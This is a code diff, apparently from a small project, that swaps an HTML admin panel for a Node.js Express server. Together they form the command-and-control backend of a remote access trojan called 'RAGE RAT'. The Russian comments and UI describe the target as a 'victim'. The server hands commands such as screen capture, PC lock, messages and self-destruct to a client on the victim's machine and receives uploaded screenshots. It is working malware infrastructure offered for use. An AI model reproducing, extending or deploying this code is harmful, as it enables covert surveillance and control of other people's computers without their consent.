@@ -1,54 +1,72 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <title>⚡ RAGE RAT CONTROL ⚡</title>
-    <style>
-        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; }
-        .container { max-width: 800px; margin: 50px auto; border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #00ff41; }
-        h1 { text-transform: uppercase; letter-spacing: 5px; border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
-        button { 
-            background: black; color: #00ff41; border: 1px solid #00ff41; padding: 10px; 
-            font-weight: bold; cursor: pointer; transition: 0.3s;
-        }
-        button:hover { background: #00ff41; color: black; box-shadow: 0 0 20px #00ff41; }
-        .danger { border-color: #ff0000; color: #ff0000; }
-        .danger:hover { background: #ff0000; color: white; box-shadow: 0 0 20px #ff0000; }
-        #preview { width: 100%; margin-top: 20px; border: 1px solid #555; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>RAT Command Center [V1.0]</h1>
-        <p>Статус: <span id="status">ОЖИДАНИЕ ЖЕРТВЫ...</span></p>
-        
-        <div class="btn-grid">
-            <button onclick="cmd('screen')">📸 СДЕЛАТЬ СКРИНШОТ</button>
-            <button onclick="cmd('lock')">🔒 ЗАБЛОКИРОВАТЬ ПК</button>
-            <button onclick="cmd('msg:Вам привет от хакера!')">💬 ПОСЛАТЬ СООБЩЕНИЕ</button>
-            <button onclick="cmd('open:[https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ)')">🎥 ВКЛЮЧИТЬ РИКРОЛЛ</button>
-            <button class="danger" onclick="cmd('self_destruct')">🧨 САМОУНИЧТОЖЕНИЕ</button>
-        </div>
+const express = require('express');
+const bodyParser = require('body-parser');
+const path = require('path');
+const app = express();
 
-        <div id="screen-box">
-            <h3>Последний скриншот:</h3>
-            <img id="preview" src="" alt="Ждем скрин...">
-        </div>
-    </div>
+// Настройка лимитов для приема тяжелых скриншотов
+app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
+app.use(bodyParser.json({ limit: '50mb' }));
 
-    <script>
-        function cmd(c) {
-            fetch('/set-command?cmd=' + encodeURIComponent(c))
-                .then(() => alert("Команда отправлена: " + c));
-        }
+// Хранилище в памяти (сбросится при перезагрузке сервера)
+let lastCommand = "none";
+let lastScreen = "";
+let victimInfo = "Ожидание подключения...";
 
-        // Обновление скриншота каждые 5 сек
-        setInterval(() => {
-            fetch('/get-screen').then(r => r.text()).then(base64 => {
-                if(base64.length > 100) document.getElementById('preview').src = "data:image/png;base64," + base64;
-            });
-        }, 5000);
-    </script>
-</body>
-</html>
+// 1. ГЛАВНАЯ СТРАНИЦА (Админка)
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+// 2. РУЧКА ДЛЯ ЖЕРТВЫ (Java Client берет команды здесь)
+app.get('/get-command', (req, res) => {
+    res.send(lastCommand);
+    // Если была команда на удаление, сбрасываем, чтобы не зациклилась
+    if (lastCommand === "self_destruct") {
+        lastCommand = "none";
+    }
+});
+
+// 3. РУЧКА ДЛЯ АДМИНКИ (Кнопки на сайте меняют команду)
+app.get('/set-command', (req, res) => {
+    const cmd = req.query.cmd;
+    if (cmd) {
+        lastCommand = cmd;
+        console.log(`[!] Новая команда установлена: ${cmd}`);
+        res.status(200).send("OK");
+    } else {
+        res.status(400).send("No command provided");
+    }
+});
+
+// 4. ПРИЕМ СКРИНШОТА ОТ ЖЕРТВЫ
+app.post('/upload-screen', (req, res) => {
+    if (req.body.img) {
+        lastScreen = req.body.img;
+        victimInfo = `Последняя активность: ${new Date().toLocaleTimeString()}`;
+        res.sendStatus(200);
+    } else {
+        res.sendStatus(400);
+    }
+});
+
+// 5. ОТДАЧА СКРИНШОТА В АДМИНКУ
+app.get('/get-screen', (req, res) => {
+    res.send(lastScreen);
+});
+
+// 6. СТАТУС ЖЕРТВЫ
+app.get('/status', (req, res) => {
+    res.send(victimInfo);
+});
+
+// ЗАПУСК СЕРВЕРА
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`
+    ======================================
+    🔥 RAGE RAT SERVER IS LIVE 🔥
+    Порт: ${PORT}
+    Админка: http://localhost:${PORT}/
+    ======================================
+    `);
+});
